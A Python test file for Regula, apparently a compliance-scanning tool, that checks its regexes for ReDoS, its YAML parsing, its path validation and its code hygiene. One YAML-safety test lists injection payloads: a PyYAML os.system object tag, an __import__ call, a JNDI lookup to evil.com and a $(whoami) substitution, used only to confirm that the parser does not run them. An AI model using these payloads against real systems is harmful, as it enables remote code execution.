# regula-ignore
#!/usr/bin/env python3
"""
Security hardening tests for Regula.

Regula is a security tool — it must be secure itself. This file tests:
  1. ReDoS resistance across ALL regex patterns (182 classify_risk + 9 credential + deps + AST)
  2. YAML fallback parser safety (no code execution)
  3. Path validation (traversal prevention)
  4. Subprocess safety (no shell=True)
  5. No eval/exec in source
"""

import ast
import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))

import helpers
from helpers import assert_eq, assert_true


# ══════════════════════════════════════════════════════════════════════
# ReDoS Resistance
# ══════════════════════════════════════════════════════════════════════

PATHOLOGICAL_INPUTS = [
    "a" * 10000,
    " " * 10000,
    "." * 10000,
    "ab" * 5000,
    "a" * 5000 + "b" * 5000,
]


def _cpu_seconds(fn):
    """CPU seconds this process spent executing fn().

    The meter is time.process_time(), NOT time.time(). Ledger rows N28, N73
    and N75 each record a wall-clock assertion flipping under machine
    contention (N28's instance: a 1.64s wall reading on a regex whose
    measured median is 0.0095s, a ~170x excursion the regex did not cause).
    Scheduler wait inflates wall clock but accrues almost no process CPU
    time, so a CPU budget is a property of the computation rather than of
    the machine's load. test_redos_meter_is_cpu_time_not_wall_clock proves
    both directions: sleep accrues ~0, catastrophic backtracking accrues
    real CPU. Residual limit, stated: CPU time still scales with single-core
    speed, so thresholds keep two orders of magnitude of headroom over the
    measured baselines.
    """
    start = time.process_time()
    fn()
    return time.process_time() - start


def _check_pattern_redos(label, pattern, inputs, flags=re.IGNORECASE,
                         threshold=10.0):
    """Test a single regex pattern against pathological inputs. Returns True if safe.

    The threshold (default 10 CPU seconds) is tuned to catch catastrophic
    backtracking (exponential blowup → minutes of CPU on 10K-char input)
    while accepting linear-time patterns that are simply slow on long
    single-line inputs. Genuine ReDoS on 10K chars burns >100 CPU seconds;
    10 is a safe boundary. The meter is CPU time (see _cpu_seconds), so the
    retry-once contention filter an earlier version carried is gone: the
    false-positive class it filtered cannot occur on a CPU meter.
    """
    for inp in inputs:
        def _search():
            try:
                re.search(pattern, inp, flags)
            except re.error:
                pass  # Invalid regex is not ReDoS
        spent = _cpu_seconds(_search)
        if spent > threshold:
            return False, f"{label}: {spent:.2f} CPU s on len={len(inp)}"
    return True, None


def test_redos_classify_risk_all_patterns():
    """All 182 classify_risk regex patterns resist pathological input."""
    from classify_risk import (
        PROHIBITED_PATTERNS, HIGH_RISK_PATTERNS,
        LIMITED_RISK_PATTERNS, AI_SECURITY_PATTERNS,
        AI_INDICATORS, GPAI_TRAINING_PATTERNS,
    )

    all_patterns = []
    for name, config in PROHIBITED_PATTERNS.items():
        for p in config["patterns"]:
            all_patterns.append((f"PROHIBITED/{name}", p))
    for name, config in HIGH_RISK_PATTERNS.items():
        for p in config["patterns"]:
            all_patterns.append((f"HIGH_RISK/{name}", p))
    for name, config in LIMITED_RISK_PATTERNS.items():
        for p in config["patterns"]:
            all_patterns.append((f"LIMITED/{name}", p))
    for name, config in AI_SECURITY_PATTERNS.items():
        for p in config["patterns"]:
            all_patterns.append((f"SECURITY/{name}", p))
    for cat, patterns in AI_INDICATORS.items():
        for p in patterns:
            all_patterns.append((f"AI_INDICATOR/{cat}", p))
    for p in GPAI_TRAINING_PATTERNS:
        all_patterns.append(("GPAI_TRAINING", p))

    issues = []
    for label, pattern in all_patterns:
        safe, msg = _check_pattern_redos(label, pattern, PATHOLOGICAL_INPUTS)
        if not safe:
            issues.append(msg)

    assert_eq(len(issues), 0, f"ReDoS in classify_risk: {issues}")
    print(f"✓ ReDoS: all {len(all_patterns)} classify_risk patterns safe")


def test_redos_credential_patterns():
    """All 9 credential_check patterns resist pathological input."""
    from credential_check import SECRET_PATTERNS

    cred_inputs = PATHOLOGICAL_INPUTS + [
        "sk-" + "a" * 10000,
        "AKIA" + "0" * 10000,
        'api_key = "' + "a" * 10000 + '"',
        "postgres://" + "a" * 10000,
    ]

    issues = []
    for name, config in SECRET_PATTERNS.items():
        safe, msg = _check_pattern_redos(f"credential/{name}", config["pattern"], cred_inputs, flags=0)
        if not safe:
            issues.append(msg)

    assert_eq(len(issues), 0, f"ReDoS in credentials: {issues}")
    print(f"✓ ReDoS: all {len(SECRET_PATTERNS)} credential patterns safe")


def test_redos_dependency_patterns():
    """dependency_scan compiled regex patterns resist pathological input."""
    from dependency_scan import _REQ_SPEC_RE

    dep_inputs = [
        "package" + "=" * 10000 + "1.0",
        "a" * 10000 + ">=1.0",
        "pkg[" + "a," * 5000 + "]>=1.0",
    ]

    for inp in dep_inputs:
        spent = _cpu_seconds(lambda: _REQ_SPEC_RE.match(inp))
        assert_true(spent < 1.0, f"ReDoS in _REQ_SPEC_RE: {spent:.2f} CPU s")
    print("✓ ReDoS: dependency_scan patterns safe")


def test_redos_ast_patterns():
    """ast_engine compiled regex patterns resist pathological input."""
    from ast_engine import (
        _RE_IMPORT_FROM, _RE_FUNCTION_DEF, _RE_CLASS_DEF,
        _RE_JAVA_IMPORT, _RE_JAVA_METHOD_DEF,
        _RE_GO_IMPORT_BLOCK, _RE_GO_FUNC_DEF,
        _RE_RUST_FN_DEF,
    )

    patterns = {
        "_RE_IMPORT_FROM": _RE_IMPORT_FROM,
        "_RE_FUNCTION_DEF": _RE_FUNCTION_DEF,
        "_RE_CLASS_DEF": _RE_CLASS_DEF,
        "_RE_JAVA_IMPORT": _RE_JAVA_IMPORT,
        "_RE_JAVA_METHOD_DEF": _RE_JAVA_METHOD_DEF,
        "_RE_GO_IMPORT_BLOCK": _RE_GO_IMPORT_BLOCK,
        "_RE_GO_FUNC_DEF": _RE_GO_FUNC_DEF,
        "_RE_RUST_FN_DEF": _RE_RUST_FN_DEF,
    }

    ast_inputs = PATHOLOGICAL_INPUTS + [
        "import " + "a." * 5000 + "b",
        "def " + "a" * 10000 + "(x):",
        "public static void " + "a" * 10000 + "(String s) {",
        "func " + "a" * 10000 + "()",
        "pub fn " + "a" * 10000 + "()",
    ]

    issues = []
    for name, pattern in patterns.items():
        for inp in ast_inputs:
            spent = _cpu_seconds(lambda: pattern.search(inp))
            if spent > 1.0:
                issues.append(f"{name}: {spent:.2f} CPU s on len={len(inp)}")

    assert_eq(len(issues), 0, f"ReDoS in ast_engine: {issues}")
    print(f"✓ ReDoS: all {len(patterns)} ast_engine patterns safe")


def test_redos_meter_is_cpu_time_not_wall_clock():
    """CONTROL for the ReDoS meter, both directions.

    The N28 defect was a wall-clock assertion flipping under scheduler
    contention: wall time grew ~170x while the regex did no extra work.
    This control proves the replacement meter cannot fail that way and can
    still fail the way it must:

    1. Wall time without CPU work (the contention shape) accrues ~nothing,
       so machine load alone can never trip a ReDoS assertion again.
    2. Genuine catastrophic backtracking accrues real CPU time, so the
       meter still detects the thing the tests exist to detect. Pattern
       (a+)+b is tried against bounded inputs from 'a'*20 + '!' through
       'a'*24 + '!'. The first input that burns more than 0.05 CPU seconds
       ends the control. This keeps the assertion meaningful across Python
       regex-engine changes without lowering its floor; the upper bound
       still fails closed if the meter cannot observe roughly 2^24
       backtracking states.
    """
    slept = _cpu_seconds(lambda: time.sleep(0.2))
    assert_true(
        slept < 0.05,
        f"meter charged {slept:.4f} CPU s for a 0.2s sleep; it is reading "
        f"wall clock, which is the N28 defect reintroduced")

    catastrophic = re.compile(r"(a+)+b")
    burned = 0.0
    input_length = 20
    for input_length in range(20, 25):
        burned = _cpu_seconds(
            lambda n=input_length: catastrophic.search("a" * n + "!"))
        if burned > 0.05:
            break
    assert_true(
        burned > 0.05,
        f"meter charged only {burned:.4f} CPU s for approximately "
        f"2^{input_length} backtracking states; a meter that cannot see "
        f"catastrophic backtracking makes every ReDoS test above vacuous")
    print("✓ ReDoS meter: CPU-time based; blind to sleep, sees backtracking")


# ══════════════════════════════════════════════════════════════════════
# YAML Safety
# ══════════════════════════════════════════════════════════════════════

def test_yaml_safe_load_only():
    """No yaml.load (without SafeLoader) anywhere in scripts/."""
    scripts_dir = Path(__file__).parent.parent / "scripts"
    issues = []

    for py_file in scripts_dir.glob("*.py"):
        source = py_file.read_text()
        # Check for yaml.load that is NOT yaml.safe_load
        for i, line in enumerate(source.split("\n"), 1):
            stripped = line.strip()
            if "yaml.load(" in stripped and "safe_load" not in stripped:
                # Check if it's using Loader=yaml.SafeLoader
                if "SafeLoader" not in stripped and "safe_load" not in stripped:
                    issues.append(f"{py_file.name}:{i}")

    assert_eq(len(issues), 0, f"Unsafe yaml.load: {issues}")
    print("✓ YAML: only safe_load used (or no yaml.load at all)")


def test_yaml_fallback_no_code_execution():
    """_parse_yaml_fallback does not execute injected code."""
    from classify_risk import _parse_yaml_fallback

    malicious = [
        "key: !!python/object/apply:os.system ['echo pwned']",
        "key: __import__('os').system('echo pwned')",
        "key: ${jndi:ldap://evil.com/a}",
        "key: {{7*7}}",
        "key: $(whoami)",
    ]

    for inp in malicious:
        result = _parse_yaml_fallback(inp)
        val = result.get("key", "")
        # Value should be a plain string, not executed
        assert_true(isinstance(val, (str, bool, int)),
                    f"YAML injection: type={type(val)} for {inp[:40]}")

    print("✓ YAML: _parse_yaml_fallback resists code injection")


# ══════════════════════════════════════════════════════════════════════
# Path Traversal
# ══════════════════════════════════════════════════════════════════════

def test_path_validation_rejects_nonexistent():
    """_validate_path rejects non-existent paths."""
    from cli import _validate_path
    from errors import PathError

    rejected = 0
    attempts = [
        "/tmp/nonexistent_regula_test_12345",
        "/tmp/nonexistent_regula_test_67890_xyz",
        "tests/fixtures/../../nonexistent",
    ]

    for path in attempts:
        try:
            _validate_path(path)
        except (PathError, Exception):
            rejected += 1

    assert_eq(rejected, len(attempts), "all non-existent paths rejected")
    print("✓ Path: _validate_path rejects non-existent paths")


def test_path_validation_resolves_symlinks():
    """_validate_path uses resolve() which follows symlinks to real path."""
    from cli import _validate_path

    # Valid path should work and return resolved Path
    result = _validate_path("tests/fixtures/sample_no_findings")
    assert_true(result.is_absolute(), "returned path is absolute")
    assert_true(result.exists(), "returned path exists")
    print("✓ Path: _validate_path returns resolved absolute path")


# ══════════════════════════════════════════════════════════════════════
# Subprocess Safety
# ══════════════════════════════════════════════════════════════════════

def test_no_shell_true():
    """No subprocess calls use shell=True in scripts/ or hooks/."""
    dirs = [
        Path(__file__).parent.parent / "scripts",
        Path(__file__).parent.parent / "hooks",
    ]
    issues = []

    for d in dirs:
        for py_file in d.glob("*.py"):
            try:
                source = py_file.read_text()
                tree = ast.parse(source)
                for node in ast.walk(tree):
                    if isinstance(node, ast.Call):
                        for kw in node.keywords:
                            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                                issues.append(f"{py_file.name}:{node.lineno}")
            except SyntaxError:
                pass

    assert_eq(len(issues), 0, f"shell=True found: {issues}")
    print("✓ Subprocess: no shell=True in scripts/ or hooks/")


def test_no_eval_exec():
    """No eval/exec calls in scripts/ or hooks/."""
    dirs = [
        Path(__file__).parent.parent / "scripts",
        Path(__file__).parent.parent / "hooks",
    ]
    issues = []

    for d in dirs:
        for py_file in d.glob("*.py"):
            try:
                source = py_file.read_text()
                tree = ast.parse(source)
                for node in ast.walk(tree):
                    if isinstance(node, ast.Call):
                        func = node.func
                        if isinstance(func, ast.Name) and func.id in ("eval", "exec"):
                            issues.append(f"{py_file.name}:{node.lineno} {func.id}()")
            except SyntaxError:
                pass

    assert_eq(len(issues), 0, f"eval/exec found: {issues}")
    print("✓ Code safety: no eval/exec in scripts/ or hooks/")


def test_no_os_system():
    """No os.system calls in scripts/ or hooks/."""
    dirs = [
        Path(__file__).parent.parent / "scripts",
        Path(__file__).parent.parent / "hooks",
    ]
    issues = []

    for d in dirs:
        for py_file in d.glob("*.py"):
            try:
                source = py_file.read_text()
                tree = ast.parse(source)
                for node in ast.walk(tree):
                    if isinstance(node, ast.Call):
                        func = node.func
                        if (isinstance(func, ast.Attribute) and
                            func.attr == "system" and
                            isinstance(func.value, ast.Name) and
                            func.value.id == "os"):
                            issues.append(f"{py_file.name}:{node.lineno}")
            except SyntaxError:
                pass

    assert_eq(len(issues), 0, f"os.system found: {issues}")
    print("✓ Code safety: no os.system in scripts/ or hooks/")


# ══════════════════════════════════════════════════════════════════════
# Self-scan
# ══════════════════════════════════════════════════════════════════════

def test_regula_self_scan_clean():
    """Regula self-scan produces no BLOCK or WARN findings.

    LOAD-INVARIANT BY CONSTRUCTION. Until 2026-08-06 this test passed
    `timeout=60` to the subprocess, which let a wall clock decide the verdict.
    MEASURED that day, same tree and same command, three runs: 61.02s at load
    average 10.10, then 25.25s, then 22.60s at 4.75, every run reporting 99%
    CPU. A 2.7x excursion against a 60s bound whose baseline is roughly 23s,
    so the suite went red under contention from two unrelated 12-hour jobs
    while the identical tree had passed hours earlier. That is N28's class in
    a second test, which N28 does not name.

    N28's recorded fix is a deterministic proxy rather than elapsed time, and
    it rules out raising the threshold, marking the test flaky and skipping
    it, because each of those is suppression. The proxy here is the scan's own
    OUTCOME plus its INTEGRITY. No elapsed time is asserted anywhere.

    The integrity half is load-bearing, not decoration. Every outcome
    assertion below has the form "no findings of category X", so a scan that
    failed to run, or ran against the wrong path, returns an empty list and
    passes all of them vacuously. That is measurement rule 4: an absent signal
    is not a passing signal. The replaced version had exactly that hole twice
    over, because its `except json.JSONDecodeError` branch fell back to a bare
    returncode check when the output was not a scan result at all.

    STATED LIMIT: no timeout remains, so a genuinely hung scanner hangs this
    test rather than failing it, and this repository configures no global
    pytest timeout. That is deliberate. Any wall-clock bound near the real
    runtime reintroduces the defect being removed, and a hung scanner is a
    real defect that should stop the suite rather than be recorded as a
    threshold breach.
    """
    import json
    import subprocess

    from constants import VERSION

    repo = Path(__file__).parent.parent
    r = subprocess.run(
        [sys.executable, "scripts/cli.py", "check", "scripts/",
         "--format", "json"],
        capture_output=True, text=True, cwd=str(repo),
    )

    # INTEGRITY: positive proof this scan executed over the intended inputs.
    try:
        output = json.loads(r.stdout)
    except json.JSONDecodeError as exc:
        raise AssertionError(
            f"the self-scan produced no parseable JSON envelope, so it did "
            f"not run to completion (rc={r.returncode}): {exc}. "
            f"stderr={r.stderr[:400]!r}") from exc

    assert_eq(output.get("command"), "check",
              "envelope is not a check result, so the scan did not run")
    assert_eq(output.get("regula_version"), VERSION,
              "envelope came from a different Regula version than the tree "
              "under test")
    payload = output.get("data")
    assert_true(isinstance(payload, dict),
                "envelope carries no decision payload, so the outcome checks "
                "would be vacuous")
    decision = payload.get("decision")
    assert_true(isinstance(decision, dict),
                "check payload carries no canonical decision")
    assert_eq(decision.get("result_type"), "insufficient_information",
              "detector observations without legal facts became a determination")
    assert_true(bool(decision.get("unresolved_predicates")),
                "an insufficient-information decision names no resolvable facts")
    findings = payload.get("detector_findings")
    assert_true(isinstance(findings, list),
                "envelope carries no detector-findings list, so there is nothing to "
                "assert about and the outcome checks would be vacuous")
    assert_true(
        len(findings) > 0,
        "the self-scan returned zero findings over scripts/, so every "
        "category assertion below would pass for the wrong reason; the scan "
        "did not reach the intended tree")
    # The `file` field carries a basename, not a path, so the check is that
    # every referenced name resolves to a real file inside the scanned tree.
    # Established by running it: an earlier draft asserted the string
    # "scripts" appeared in each value and failed against `assess.py`.
    referenced = {f.get("file", "") for f in findings if f.get("file")}
    in_tree = {p.name for p in (repo / "scripts").rglob("*.py")}
    assert_true(bool(referenced),
                "no finding names a file, so the scan cannot be shown to "
                "have read anything")
    assert_eq(
        sorted(referenced - in_tree), [],
        "findings name files that do not exist under scripts/, so the scan "
        "ran somewhere other than the intended tree")

    # OUTCOME: unchanged in meaning from the version this replaces.
    active = [f for f in findings if not f.get("suppressed")]
    prohibited = [f for f in active if f.get("detector_class") == "prohibited"]
    high_risk = [f for f in active if f.get("detector_class") == "high_risk"]
    credentials = [f for f in active if f.get("detector_class") == "credential_exposure"]

    # explain_articles.py describes prohibited practices by design, exclude it
    prohibited = [f for f in prohibited if "explain_articles" not in f.get("file", "")]
    assert_eq(len(prohibited), 0, "no prohibited findings in own code (excluding explain_articles.py)")
    assert_eq(len(credentials), 0, "no credential findings in own code")
    # High-risk findings in a governance tool's own code would be false positives
    # risk_patterns.py and regulation modules contain high-risk keywords by design
    high_risk = [f for f in high_risk if not any(x in f.get("file", "") for x in ("risk_patterns", "content/regulations", "explain_articles", "cli.py", "cli_scan", "cli_compliance", "cli_governance", "report.py", "remediation"))]
    assert_eq(len(high_risk), 0, "no high-risk findings in own code (excluding pattern/regulation/CLI definitions)")

    print("✓ Self-scan: Regula's own code is clean")


# ══════════════════════════════════════════════════════════════════════
# Runner
# ══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    tests = [
        # ReDoS (4 tests)
        test_redos_classify_risk_all_patterns,
        test_redos_credential_patterns,
        test_redos_dependency_patterns,
        test_redos_ast_patterns,
        # YAML safety (2 tests)
        test_yaml_safe_load_only,
        test_yaml_fallback_no_code_execution,
        # Path traversal (2 tests)
        test_path_validation_rejects_nonexistent,
        test_path_validation_resolves_symlinks,
        # Subprocess safety (3 tests)
        test_no_shell_true,
        test_no_eval_exec,
        test_no_os_system,
        # Self-scan (1 test)
        test_regula_self_scan_clean,
    ]

    print(f"Running {len(tests)} security hardening tests...\n")

    for test in tests:
        try:
            test()
        except Exception as e:
            helpers.failed += 1
            print(f"  EXCEPTION in {test.__name__}: {e}")

    print(f"\n{'=' * 50}")
    print(f"Results: {helpers.passed} passed, {helpers.failed} failed ({len(tests)} test functions)")
    if helpers.failed:
        print("SOME TESTS FAILED")
        sys.exit(1)
    else:
        print("All tests passed!")
